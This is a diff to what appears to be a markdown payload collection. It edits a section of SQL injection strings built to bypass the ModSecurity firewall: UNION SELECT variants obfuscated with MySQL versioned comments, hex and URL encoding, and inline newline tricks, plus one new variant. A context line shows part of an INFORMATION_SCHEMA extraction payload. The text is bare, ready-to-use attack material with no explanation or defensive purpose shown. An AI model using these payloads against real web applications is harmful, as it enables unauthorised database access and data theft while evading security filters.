@@ -868,11 +868,13 @@ CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFO
 ### sql inyection payload+ bypass Mod_Security 
 
 ```
-+/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
+/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+
 
 /*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...
 
--1+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
+/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--
+
+/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+
 
 ```
 
